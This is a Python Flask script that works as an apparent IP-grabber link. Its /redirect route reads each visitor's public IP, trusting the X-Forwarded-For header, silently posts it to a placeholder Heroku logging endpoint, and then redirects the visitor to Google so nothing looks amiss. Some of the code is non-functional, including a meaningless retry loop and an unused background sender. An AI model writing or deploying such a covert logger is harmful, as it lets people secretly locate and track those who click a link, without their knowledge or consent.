from flask import Flask, request, redirect
import requests
import threading
import time
import ipaddress  # For IP comparison

app = Flask(__name__)

# Define specific private IP ranges to exclude
excluded_private_ip_ranges = [
    ipaddress.ip_network("10.0.0.0/8"),  # Exclude the entire 10.x.x.x range
    ipaddress.ip_network("192.168.0.0/16"),  # Exclude the entire 192.168.x.x range
    ipaddress.ip_network("172.16.0.0/12"),  # Exclude the 172.16.x.x to 172.31.x.x range
    ipaddress.ip_network("127.0.0.0/8"),  # Exclude loopback addresses
]

# Route to handle the initial redirect
@app.route('/')
def home():
    # First, redirect the user to Google
    return redirect('https://google.com')

@app.route('/redirect', methods=['GET'])
def send_ip_and_redirect():
    # Extract client IP after the redirect
    client_ip = get_client_ip()

    # If the IP is private, return an error message
    if not is_public_ip(client_ip):
        print(f"Private IP detected: {client_ip}")
        return "Error: Could not determine a valid public IP address.", 400

    # Print the public IP for debugging
    print(f"Client Public IP: {client_ip}")

    # Send the IP address to another server
    target_server_url = "https://your-heroku-app.herokuapp.com/log_ip"  # Replace with your target server URL
    payload = {"ip": client_ip}

    try:
        requests.post(target_server_url, json=payload)
    except Exception as e:
        print(f"Error sending IP: {e}")

    # After sending the IP, attempt to redirect the user to Google (this is just for retry logic)
    target_url = "https://google.com"
    max_attempts = 5  # Maximum retry attempts
    delay = 2  # Delay between retries in seconds

    for attempt in range(1, max_attempts + 1):
        try:
            print(f"Attempt {attempt}: Redirecting to {target_url}")
            return redirect(target_url)
        except Exception as e:
            print(f"Redirect failed on attempt {attempt}: {e}")
            if attempt < max_attempts:
                time.sleep(delay)  # Wait before retrying

    # If all attempts fail, return an error message
    print("All redirect attempts failed.")
    return "Failed to redirect after multiple attempts.", 500

# Function to get client IP (adapted for proxies)
def get_client_ip():
    x_forwarded_for = request.headers.get('X-Forwarded-For')

    if x_forwarded_for:
        # Extract client IP from the X-Forwarded-For header
        ip_list = [ip.strip() for ip in x_forwarded_for.split(',')]
        for ip in ip_list:
            if is_public_ip(ip):  # Ensure we only accept public IPs
                print(f"Found public IP: {ip}")
                return ip
        return ip_list[-1]  # If no public IP is found, return the last one (likely the proxy)
    else:
        # No X-Forwarded-For, fallback to remote address
        return request.remote_addr

# Function to check if the IP is a public IP
def is_public_ip(ip):
    try:
        # Convert IP to ipaddress object
        ip_obj = ipaddress.ip_address(ip)

        # Check if the IP belongs to an excluded private range
        for excluded_range in excluded_private_ip_ranges:
            if ip_obj in excluded_range:
                return False  # This IP is in an excluded private range

        return True  # This is a public IP
    except ValueError:
        # If the IP format is invalid, treat it as private
        return False

# Function to handle background task to send the public IP after redirect
def background_send_ip(ip):
    target_server_url = "https://your-heroku-app.herokuapp.com/log_ip"  # Replace with your target server URL
    payload = {"ip": ip}

    try:
        requests.post(target_server_url, json=payload)
    except Exception as e:
        print(f"Error sending IP: {e}")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
